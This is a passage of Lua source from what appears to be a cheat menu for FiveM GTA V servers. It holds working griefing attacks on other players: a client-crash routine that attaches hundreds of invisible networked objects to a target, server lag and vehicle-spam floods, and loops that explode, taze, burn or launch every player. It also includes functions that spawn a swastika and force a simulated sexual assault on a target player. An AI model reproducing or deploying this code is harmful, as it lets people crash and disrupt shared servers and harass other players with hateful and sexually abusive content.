   
                    self:GetFunction("SetVehicleForwardSpeed")(vehicle, speed)
   
                    self:GetFunction("SetVehicleCurrentRpm")(vehicle, rpm)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:GetTextInput(TextEntry, ExampleText, MaxStringLength)
   
            local _text_input = TextEntry .. " ~r~(DO NOT PRESS ESCAPE / RMB)"
   
            self:GetFunction("AddTextEntry")("FMMC_KEY_TIP1_MISC", _text_input)
   
            self:GetFunction("DisplayOnscreenKeyboard")(1, "FMMC_KEY_TIP1_MISC", "", dict.tostring(ExampleText), "", "", "", dict.tonumber(MaxStringLength) or 500)
   
            blockinput = true
   
    
   
            while self:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and self:GetFunction("UpdateOnscreenKeyboard")() ~= 2 do
   
                if self.Showing then
   
                    self:DrawMenu()
   
                end
   
    
   
                Wait(0)
   
            end
   
    
   
            if self:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then
   
                if self.Showing then
   
                    self:DrawMenu()
   
                end
   
    
   
                _text_input = nil
   
                local result = self:GetFunction("GetOnscreenKeyboardResult")()
   
                blockinput = false
   
                self:GetFunction("CancelOnscreenKeyboard")()
   
    
   
                return result
   
            else
   
                if self.Showing then
   
                    self:DrawMenu()
   
                end
   
    
   
                _text_input = nil
   
                blockinput = false
   
                self:GetFunction("CancelOnscreenKeyboard")()
   
    
   
                return nil
   
            end
   
        end
   
    
   
        function AREF.Util:DeleteEntity(entity)
   
            if not AREF:GetFunction("DoesEntityExist")(entity) then return end
   
            AREF:GetFunction("NetworkRequestControlOfEntity")(entity)
   
            AREF:GetFunction("SetEntityAsMissionEntity")(entity, true, true)
   
            AREF:GetFunction("DeletePed")(entity)
   
            AREF:GetFunction("DeleteEntity")(entity)
   
            AREF:GetFunction("DeleteObject")(entity)
   
            AREF:GetFunction("DeleteVehicle")(entity)
   
    
   
            return true
   
        end
   
    
   
        local sounds = {
   
            ["INFO"] = {
   
                times = 3,
   
                name = "DELETE",
   
                dict = "HUD_DEATHMATCH_SOUNDSET"
   
            },
   
            ["SUCCESS"] = {
   
                times = 1,
   
                name = "Pin_Centred",
   
                dict = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"
   
            },
   
            ["WARN"] = {
   
                times = 1,
   
                name = "Turn",
   
                dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS"
   
            },
   
            ["ERROR"] = {
   
                times = 3,
   
                name = "Hack_Failed",
   
                dict = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"
   
            }
   
        }
   
    
   
        local last_sound = 0
   
    
   
        function AREF:AddNotification(type, msg, timeout)
   
            timeout = timeout or 10000
   
    
   
            if self.Config.UseSounds and last_sound <= self:GetFunction("GetGameTimer")() then
   
                local sound = sounds[type] or {}
   
    
   
                for i = 1, sound.times or 1 do
   
                    if sound.name and sound.dict then
   
                        self:GetFunction("PlaySoundFrontend")(-1, sound.name, sound.dict, false)
   
                    end
   
                end
   
    
   
                last_sound = self:GetFunction("GetGameTimer")() + 200
   
            end
   
    
   
            for _, v in dict.ipairs(self.Notifications) do
   
                if (v.RawMsg or v.Message) == msg and not self.Notifications[_ + 1] then
   
                    v.Count = (v.Count or 1) + 1
   
                    v.RawMsg = v.RawMsg or v.Message
   
                    v.Message = v.RawMsg .. " ~s~(x" .. v.Count .. ")"
   
                    v.Duration = (timeout / 1000)
   
                    v.Expires = self:GetFunction("GetGameTimer")() + timeout
   
    
   
                    return
   
                end
   
            end
   
    
   
            local notification = {}
   
            notification.Type = type
   
            notification.Message = msg
   
            notification.Duration = timeout / 1000
   
            notification.Expires = self:GetFunction("GetGameTimer")() + timeout
   
            self.Notifications[#self.Notifications + 1] = notification
   
            self:Print("[Notification] [" .. type .. "]" .. ": " .. msg)
   
        end
   
    
   
        function AREF:DoNetwork(obj)
   
            if not self:GetFunction("DoesEntityExist")(obj) then return end
   
            local id = self:GetFunction("ObjToNet")(obj)
   
            self:GetFunction("NetworkSetNetworkIdDynamic")(id, true)
   
            self:GetFunction("SetNetworkIdExistsOnAllMachines")(id, true)
   
            self:GetFunction("SetNetworkIdCanMigrate")(id, false)
   
    
   
            for _, src in dict.pairs(self.PlayerCache) do
   
                self:GetFunction("SetNetworkIdSyncToPlayer")(id, src, true)
   
            end
   
        end
   
    
   
        function AREF:GasPlayer(player)
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                local ped = self:GetFunction("GetPlayerPed")(player)
   
                if not self:GetFunction("DoesEntityExist")(ped) then return end
   
    
   
                if self.Config.SafeMode then
   
                    self:GetFunction("ClearPedTasksImmediately")(ped)
   
                end
   
    
   
                local dest = self:GetFunction("GetPedBoneCoords")(ped, self:GetFunction("GetPedBoneIndex")(ped, 0), 0.0, 0.0, 0.0, 0.0)
   
                local origin = self:GetFunction("GetPedBoneCoords")(ped, self:GetFunction("GetPedBoneIndex")(ped, 57005), 0.0, 0.0, 0.0, 0.0)
   
    
   
                for i = 1, 5 do
   
                    self:GetFunction("AddExplosion")(origin.x + dict.math.random(-1, 1), origin.y + dict.math.random(-1, 1), origin.z - 1.0, 12, 100.0, true, false, 0.0)
   
                    Wait(10)
   
                end
   
    
   
                local pos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
                local fence_u = self:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
   
                self:DoNetwork(fence_u)
   
                self:GetFunction("SetEntityRotation")(fence_u, 0.0, 0.0, 0.0)
   
                self:GetFunction("FreezeEntityPosition")(fence_u, true)
   
                Wait(10)
   
                local fence_r = self:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
   
                self:DoNetwork(fence_r)
   
                self:GetFunction("SetEntityRotation")(fence_r, 0.0, 0.0, 90.0)
   
                self:GetFunction("FreezeEntityPosition")(fence_r, true)
   
                Wait(10)
   
                local fence_b = self:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y + 1.85, pos.z - 1.0, true, true, true)
   
                self:DoNetwork(fence_b)
   
                self:GetFunction("SetEntityRotation")(fence_b, 0.0, 0.0, 0.0)
   
                self:GetFunction("FreezeEntityPosition")(fence_b, true)
   
                local fence_l = self:GetFunction("CreateObject")(-759902142, pos.x + 1.35, pos.y - 1.0, pos.z - 1.0, true, true, true)
   
                self:DoNetwork(fence_l)
   
                self:GetFunction("SetEntityRotation")(fence_l, 0.0, 0.0, 90.0)
   
                self:GetFunction("FreezeEntityPosition")(fence_l, true)
   
                self.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](ped, 10.0)
   
            end)
   
        end
   
    
   
        function AREF:TazePlayer(player)
   
            local ped = self:GetFunction("GetPlayerPed")(player)
   
            local destination = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
   
            local origin = self:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
   
            self:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, self:GetFunction("GetHashKey")("WEAPON_STUNGUN"), self.LocalPlayer, true, false, 24000.0)
   
        end
   
    
   
        function AREF:HydrantPlayer(player)
   
            local ped = self:GetFunction("GetPlayerPed")(player)
   
            local origin = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
   
            self:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 13, 100.0, (self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
   
        end
   
    
   
        function AREF:FirePlayer(player)
   
            local ped = self:GetFunction("GetPlayerPed")(player)
   
            local origin = self:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
   
            self:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 12, 100.0, (self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
   
        end
   
    
   
        local crash_model_list = {}
   
        local crash_models = {"hei_prop_carrier_cargo_02a", "p_cablecar_s", "p_ferris_car_01", "prop_cj_big_boat", "prop_rock_4_big2", "prop_steps_big_01", "v_ilev_lest_bigscreen", "prop_carcreeper", "apa_mp_h_bed_double_09", "apa_mp_h_bed_wide_05", "sanchez", "cargobob", "prop_cattlecrush", "prop_cs_documents_01"} --{"prop_ferris_car_01_lod1", "prop_construcionlamp_01", "prop_fncconstruc_01d", "prop_fncconstruc_02a", "p_dock_crane_cabl_s", "prop_dock_crane_01", "prop_dock_crane_02_cab", "prop_dock_float_1", "prop_dock_crane_lift", "apa_mp_h_bed_wide_05", "apa_mp_h_bed_double_08", "apa_mp_h_bed_double_09", "csx_seabed_bldr4_", "imp_prop_impexp_sofabed_01a", "apa_mp_h_yacht_bed_01"}
   
    
   
        CreateThread(function()
   
            AREF:RequestModelSync(spike_model)
   
            local loaded = 0
   
    
   
            for i = 1, #crash_models do
   
                if AREF:RequestModelSync(crash_models[i]) then
   
                    loaded = loaded + 1
   
                end
   
            end
   
    
   
            for i = 1, #crash_models * 5 do
   
                for _ = 1, 2 do
   
                    crash_models[#crash_models + 1] = crash_models[dict.math.random(1, #crash_models)]
   
                    loaded = loaded + 1
   
                end
   
            end
   
    
   
            AREF:Print("[MISC] Loaded " .. loaded .. " model(s).")
   
        end)
   
    
   
        local crash_loop
   
        local notified_crash = {}
   
    
   
        function AREF:CrashPlayer(player, all, strict)
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
            local ATT_LIMIT = 400
   
            local CUR_ATT_COUNT = 0
   
    
   
            CreateThread(function()
   
                local ped = self:GetFunction("GetPlayerPed")(player)
   
                local playerPos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
                local selfPos = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)
   
                local dist = self:GetFunction("GetDistanceBetweenCoords")(playerPos.x, playerPos.y, playerPos.z, selfPos.x, selfPos.y, selfPos.z, true)
   
    
   
                if dist <= 500.0 then
   
                    local safeX, safeY, safeZ = playerPos.x - dict.math.random(-1000, 1000), playerPos.y - dict.math.random(-1000, 1000), -200
   
                    self:GetFunction("SetEntityCoords")(self.LocalPlayer, _clamp(safeX, -2000, 2000) + 0.0, _clamp(safeY, -2000, 2000) + 0.0, safeZ, false, false, false, false)
   
                end
   
    
   
                self:AddNotification("INFO", "Crashing " .. self:CleanName(self:GetFunction("GetPlayerName")(player)), 10000)
   
                local bad_obj
   
    
   
                for i = 1, ATT_LIMIT do
   
                    if CUR_ATT_COUNT >= ATT_LIMIT or not self:GetFunction("DoesEntityExist")(ped) then break end
   
                    local method = dict.math.random(1, 2)
   
    
   
                    if strict == "object" then
   
                        method = 1
   
                    elseif strict == "ped" then
   
                        method = 2
   
                    end
   
    
   
                    if method == 1 then
   
                        local model = crash_models[dict.math.random(1, #crash_models)]
   
                        local obj = self:GetFunction("CreateObject")(self:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, true, true, true)
   
    
   
                        if not self:GetFunction("DoesEntityExist")(obj) then
   
                            bad_obj = true
   
    
   
                            if not notified_crash[model] then
   
                                self:Print("[CRASH] Failed to load object ^3" .. model .. "^7")
   
                                notified_crash[model] = true
   
                            end
   
                        else
   
                            self:DoNetwork(obj)
   
                            self:GetFunction("AttachEntityToEntity")(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
   
                            self:GetFunction("SetEntityVisible")(obj, false)
   
                            crash_model_list[obj] = true
   
                            CUR_ATT_COUNT = CUR_ATT_COUNT + 1
   
                        end
   
                    elseif method == 2 then
   
                        local model = self.FreeCam.SpawnerOptions.PED[dict.math.random(1, #self.FreeCam.SpawnerOptions.PED)]
   
                        local ent = self:GetFunction("CreatePed")(24, self:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, 0.0, true, true)
   
    
   
                        if self:GetFunction("DoesEntityExist")(ent) then
   
                            self:DoNetwork(ent)
   
                            self:GetFunction("AttachEntityToEntity")(ent, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, 1, false)
   
                            self:GetFunction("SetEntityVisible")(ent, false)
   
                            crash_model_list[ent] = true
   
                            CUR_ATT_COUNT = CUR_ATT_COUNT + 1
   
                        end
   
                    end
   
    
   
                    Wait(0)
   
                end
   
    
   
                if bad_obj then
   
                    self:AddNotification("ERROR", "Some crash models failed to load. See console for details.", 10000)
   
                end
   
    
   
                notified_crash = {}
   
                self:CleanupCrash(player, all)
   
            end)
   
        end
   
    
   
        function AREF:CleanupCrash(player, all)
   
            CreateThread(function()
   
                if crash_loop ~= nil and not all then return end
   
                crash_loop = not all and player or nil
   
    
   
                if crash_loop and not self:GetFunction("DoesEntityExist")(crash_loop) then
   
                    crash_loop = nil
   
                end
   
    
   
                local timeout = 0
   
    
   
                while (all and timeout <= 180000) or (self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(crash_loop)) and timeout <= 120000) do
   
                    timeout = timeout + 100
   
                    Wait(100)
   
                end
   
    
   
                while true do
   
                    if not self.Enabled then return end
   
    
   
                    for cobj, _ in dict.pairs(crash_model_list) do
   
                        if self:RequestControlSync(cobj) then
   
                            self:GetFunction("DeleteObject")(cobj)
   
                            self:GetFunction("DeleteEntity")(cobj)
   
                            crash_model_list[cobj] = nil
   
                        end
   
                    end
   
    
   
                    if #crash_model_list == 0 then
   
                        self:AddNotification("INFO", "Cleaned up crash objects.")
   
                        crash_loop = nil
   
    
   
                        return
   
                    else
   
                        self:AddNotification("ERROR", "Failed to cleanup " .. #crash_model_list .. " crash object" .. (#crash_model_list ~= 1 and "s" or "") .. ". Retrying in 5 seconds.")
   
                        Wait(5000)
   
                    end
   
                end
   
            end)
   
        end
   
    
   
        function AREF:RapePlayer(player)
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                local model = self.FreeCam.SpawnerOptions.PED[dict.math.random(1, #self.FreeCam.SpawnerOptions.PED)]
   
                self:RequestModelSync(model)
   
                self:GetFunction("RequestAnimDict")("rcmpaparazzo_2")
   
    
   
                while not self:GetFunction("HasAnimDictLoaded")("rcmpaparazzo_2") do
   
                    Wait(0)
   
                end
   
    
   
                if self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(player), true) then
   
                    local veh = self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(player), true)
   
    
   
                    if not self.Config.SafeMode then
   
                        self:GetFunction("ClearPedTasksImmediately")(self:GetFunction("GetPlayerPed")(player))
   
                    end
   
    
   
                    while not self:GetFunction("NetworkHasControlOfEntity")(veh) do
   
                        self:GetFunction("NetworkRequestControlOfEntity")(veh)
   
                        Wait(0)
   
                    end
   
    
   
                    self:GetFunction("SetEntityAsMissionEntity")(veh, true, true)
   
                    self:GetFunction("DeleteVehicle")(veh)
   
                    self:GetFunction("DeleteEntity")(veh)
   
                end
   
    
   
                local count = -0.2
   
    
   
                for _ = 1, 3 do
   
                    local c = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(player), 0.0, 0.0, 0.0)
   
                    local x, y, z = c.x, c.y, c.z
   
                    local rape_ped = self:GetFunction("CreatePed")(4, self:GetFunction("GetHashKey")(model), x, y, z, 0.0, true, false)
   
                    self:GetFunction("SetEntityAsMissionEntity")(rape_ped, true, true)
   
                    self:GetFunction("AttachEntityToEntity")(rape_ped, self:GetFunction("GetPlayerPed")(player), 4103, 11816, count, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
   
                    self:GetFunction("ClearPedTasks")(self:GetFunction("GetPlayerPed")(player))
   
                    self:GetFunction("TaskPlayAnim")(self:GetFunction("GetPlayerPed")(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
   
                    self:GetFunction("SetPedKeepTask")(rape_ped)
   
                    self:GetFunction("SetPedAlertness")(rape_ped, 0.0)
   
                    self:GetFunction("TaskPlayAnim")(rape_ped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
   
                    self:GetFunction("SetEntityInvincible")(rape_ped, true)
   
                    count = count - 0.4
   
                end
   
            end)
   
        end
   
    
   
        local car_spam = {"asea", "adder", "dinghy", "biff", "rhapsody", "ruiner", "picador", "sabregt", "baller4", "emperor", "ingot", "primo2", "velum2", "vestra", "baller", "fq2", "dubsta", "patriot", "rocoto", "primo", "stratum", "surge", "tailgater", "washington", "airbus", "tourbus", "taxi", "rentalbus", "banshee", "blista2", "bestiagts", "blistveh", "comet2", "buffalo", "coquette", "ninef", "dodo", "trash2", "radi", "jester", "jet", "tug", "bus", "dump"}
   
    
   
        function AREF:GetVehicleHashFromModel(model)
   
            for i = 1, #car_spam do
   
                if model == self:GetFunction("GetHashKey")(car_spam[i]) then return car_spam[i] end
   
            end
   
        end
   
    
   
        function AREF:CarSpamServer()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                for _, hash in dict.ipairs(car_spam) do
   
                    self:RequestModelSync(hash)
   
    
   
                    for _, src in dict.pairs(self.PlayerCache) do
   
                        src = dict.tonumber(src)
   
    
   
                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                            local ped = self:GetFunction("GetPlayerPed")(src)
   
                            local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
   
                            self:GetFunction("CreateVehicle")(self:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, self:GetFunction("GetEntityHeading")(ped), true, false)
   
                        end
   
    
   
                        Wait(5)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        local _use_lag_server
   
        local _use_hydrant_loop
   
        local _use_fire_loop
   
        local _use_taze_loop
   
        local _use_delete_loop
   
        local _use_explode_vehicle_loop
   
        local _use_explode_player_loop
   
        local _use_launch_loop
   
    
   
        function AREF:LaggingServer()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_lag_server do
   
                    for _, hash in dict.ipairs(car_spam) do
   
                        self:RequestModelSync(hash)
   
    
   
    
   
                        Wait(5)
   
                    end
   
    
   
                    Wait(20)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:HydrantLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_hydrant_loop do
   
                    for _, src in dict.pairs(self.PlayerCache) do
   
                        if not _use_hydrant_loop then break end
   
                        src = dict.tonumber(src)
   
    
   
                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                            self:HydrantPlayer(src)
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:FireLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_fire_loop do
   
                    for _, src in dict.pairs(self.PlayerCache) do
   
                        if not _use_fire_loop then break end
   
                        src = dict.tonumber(src)
   
    
   
                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                            self:FirePlayer(src)
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:TazeLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_taze_loop do
   
                    for _, src in dict.pairs(self.PlayerCache) do
   
                        if not _use_taze_loop then break end
   
                        src = dict.tonumber(src)
   
    
   
                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                            self:TazePlayer(src)
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:DeleteLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_delete_loop do
   
                    local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    for veh in self:EnumerateVehicles() do
   
                        if not _use_delete_loop then break end
   
    
   
                        if veh ~= _veh or self.Config.OnlineIncludeSelf then
   
                            self.Util:DeleteEntity(veh)
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:ExplodeVehicleLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_explode_vehicle_loop do
   
                    local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    for veh in self:EnumerateVehicles() do
   
                        if not _use_explode_vehicle_loop then break end
   
    
   
                        if veh ~= _veh or self.Config.OnlineIncludeSelf then
   
                            self:GetFunction("NetworkExplodeVehicle")(veh, true, false, false)
   
                            self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(veh, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:ExplodePlayerLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_explode_player_loop do
   
                    for _, src in dict.pairs(self.PlayerCache) do
   
                        if not _use_explode_player_loop then break end
   
                        src = dict.tonumber(src)
   
    
   
                        if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then
   
                            self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:LaunchLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_launch_loop do
   
                    local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    for veh in self:EnumerateVehicles() do
   
                        if not _use_launch_loop then break end
   
    
   
                        if veh ~= _veh or self.Config.OnlineIncludeSelf then
   
                            if self:RequestControlSync(veh) then
   
                                self:GetFunction("ApplyForceToEntity")(veh, 3, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
   
                            end
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:DisableLoop()
   
            if self.Config.SafeMode then return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
   
    
   
            CreateThread(function()
   
                while _use_launch_loop do
   
                    local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    for veh in self:EnumerateVehicles() do
   
                        if not _use_launch_loop then break end
   
    
   
                        if veh ~= _veh or self.Config.OnlineIncludeSelf then
   
                            if self:RequestControlSync(veh) then
   
                                self:GetFunction("SetEntityAsMissionEntity")(veh, false, false)
   
                                self:GetFunction("StartVehicleAlarm")(veh)
   
                                self:GetFunction("DetachVehicleWindscreen")(veh)
   
                                self:GetFunction("SetVehicleLights")(veh, 1)
   
                                self:GetFunction("SetVehicleLightsMode")(veh, 1)
   
                                self:GetFunction("SetVehicleBurnout")(veh, true)
   
                                self:GetFunction("SetVehicleGravityAmount")(veh, math.huge)
   
                                self:GetFunction("SetVehicleSteeringScale")(veh, 100.0)
   
                                self:GetFunction("SetVehicleHandlingFloat")(veh, "CHandlingData", "fDriveBiasFront", 0.9)
   
                                self:GetFunction("SetVehicleSteerBias")(veh, 1.0)
   
    
   
                                for i = 0, self:GetFunction("GetVehicleNumberOfWheels")(veh) do
   
                                    self:GetFunction("SetVehicleTyreBurst")(veh, i, false, 1000.0)
   
                                end
   
                            end
   
                        end
   
    
   
                        Wait(1)
   
                    end
   
    
   
                    Wait(5)
   
                end
   
            end)
   
        end
   
    
   
        function AREF:SpawnPed(where, heading, model, weapon)
   
            if not self:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~s~in time.", 2500) end
   
            local ped = self:GetFunction("CreatePed")(4, self:GetFunction("GetHashKey")(model), where.x, where.y, where.z, heading or 0.0, true, true)
   
            self:GetFunction("SetNetworkIdCanMigrate")(self:GetFunction("NetworkGetNetworkIdFromEntity")(ped), true)
   
            self:GetFunction("NetworkSetNetworkIdDynamic")(self:GetFunction("NetworkGetNetworkIdFromEntity")(ped), false)
   
    
   
            if weapon then
   
                self:GetFunction("GiveWeaponToPed")(ped, self:GetFunction("GetHashKey")(weapon), 9000, false, true)
   
            end
   
    
   
            self:GetFunction("SetPedAccuracy")(ped, 100)
   
    
   
            return ped
   
        end
   
    
   
        function AREF:UnlockVehicle(veh, lock)
   
            CreateThread(function()
   
                if not self:GetFunction("DoesEntityExist")(veh) or not self:GetFunction("IsEntityAVehicle")(veh) then return end
   
                if not self:RequestControlSync(veh) then return self:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
   
                self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, lock)
   
                self:GetFunction("SetVehicleDoorsLockedForPlayer")(veh, self.NetworkID, lock)
   
                self:GetFunction("SetVehicleDoorsLocked")(veh, lock)
   
                self:AddNotification("SUCCESS", "Vehicle " .. (lock and "locked" or "unlocked") .. ".", 5000)
   
            end)
   
        end
   
    
   
        function AREF:DisableVehicle(veh)
   
            CreateThread(function()
   
                if not self:GetFunction("DoesEntityExist")(veh) or not self:GetFunction("IsEntityAVehicle")(veh) then return end
   
                if not self:RequestControlSync(veh) then return self:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
   
                self:GetFunction("SetEntityAsMissionEntity")(veh, false, false)
   
                self:GetFunction("StartVehicleAlarm")(veh)
   
                self:GetFunction("DetachVehicleWindscreen")(veh)
   
                self:GetFunction("SetVehicleLights")(veh, 1)
   
                self:GetFunction("SetVehicleLightsMode")(veh, 1)
   
                self:GetFunction("SetVehicleBurnout")(veh, true)
   
                self:GetFunction("SetVehicleGravityAmount")(veh, math.huge)
   
                self:GetFunction("SetVehicleSteeringScale")(veh, 100.0)
   
                self:GetFunction("SetVehicleHandlingFloat")(veh, "CHandlingData", "fDriveBiasFront", 0.9)
   
                self:GetFunction("SetVehicleSteerBias")(veh, 1.0)
   
    
   
                for i = 0, self:GetFunction("GetVehicleNumberOfWheels")(veh) do
   
                    self:GetFunction("SetVehicleTyreBurst")(veh, i, false, 1000.0)
   
                end
   
    
   
                self:AddNotification("SUCCESS", "Vehicle disabled.", 5000)
   
            end)
   
        end
   
    
   
        function AREF:StealVehicleThread(who, veh, nodrive)
   
            if not self:GetFunction("DoesEntityExist")(veh) or not self:GetFunction("IsEntityAVehicle")(veh) then return end
   
            self:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, true)
   
            self:GetFunction("ClearPedTasks")(who)
   
            local driver = self:GetFunction("GetPedInVehicleSeat")(veh, -1)
   
            local timeout = 0
   
    
   
            if self:GetFunction("DoesEntityExist")(driver) then
   
                while self:GetFunction("DoesEntityExist")(veh) and self:GetFunction("GetPedInVehicleSeat")(veh, -1) == driver and timeout <= 25000 do
   
                    self:GetFunction("TaskCombatPed")(who, driver, 0, 16)
   
                    timeout = timeout + 100
   
                    self:GetFunction("NetworkRequestControlOfEntity")(veh)
   
                    self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
   
                    self:GetFunction("SetVehicleDoorsLocked")(veh, 7)
   
    
   
                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["R"]) then
   
                        self.Util:DeleteEntity(who)
   
                        self:AddNotification("INFO", "Hijack cancelled.")
   
    
   
                        return false
   
                    end
   
    
   
                    Wait(100)
   
                end
   
    
   
                self:GetFunction("ClearPedTasks")(who)
   
                self:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)
   
    
   
                while self:GetFunction("DoesEntityExist")(veh) and self:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
   
                    timeout = timeout + 100
   
                    self:GetFunction("NetworkRequestControlOfEntity")(veh)
   
                    self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
   
                    self:GetFunction("SetVehicleDoorsLocked")(veh, 7)
   
    
   
                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["R"]) then
   
                        self.Util:DeleteEntity(who)
   
                        self:AddNotification("INFO", "Hijack cancelled.")
   
    
   
                        return false
   
                    end
   
    
   
                    Wait(100)
   
                end
   
            else
   
